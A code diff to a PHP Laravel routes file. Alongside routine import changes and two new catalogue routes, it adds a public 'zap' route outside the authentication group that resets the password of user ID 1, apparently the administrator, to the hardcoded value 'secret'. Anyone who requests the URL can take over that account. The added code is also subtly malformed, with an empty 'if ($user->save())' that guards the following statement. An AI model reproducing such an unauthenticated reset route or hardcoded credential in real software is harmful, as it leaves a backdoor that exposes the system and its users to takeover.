@@ -1,7 +1,5 @@
 <?php
-use Insight\ProductDefinitions\AttributeSet;
-use Insight\ProductDefinitions\Attribute;
-use Insight\Companies\Company;
+use Insight\Permissions\Permission;
 
 /*
 |--------------------------------------------------------------------------
@@ -13,6 +11,24 @@ use Insight\Companies\Company;
 | and give it the Closure to execute when that URI is requested.
 |
 */
+
+Route::get('zap', function(){
+    $user = Sentry::findUserById(1);
+    $resetCode = $user->getResetPasswordCode();
+
+    // Update the user
+    if ($user->save())
+
+    if ($user->attemptResetPassword($resetCode, 'secret'))
+    {
+        return 'Success';
+    }
+    else
+    {
+        return Redirect::back();
+    }
+
+});
 
 // Authentication routes
 
@@ -85,6 +101,8 @@ Route::group(array('before' => 'auth'), function()
 
     Route::group(array('prefix' => 'catalogue'), function()
     {
+        Route::get('product-definitions/myrequests', ['as' => 'catalogue.product-definitions.queue', 'uses' => 'ProductDefinitionsController@getQueue']);
+        Route::get('product-definitions/completed', ['as' => 'catalogue.product-definitions.completed', 'uses' => 'ProductDefinitionsController@getCompleted']);
         Route::resource('product-definitions', 'ProductDefinitionsController');
         Route::get('cataloguing/suppliers/{cid}', array(
             'as' => 'catalogue.suppliers',
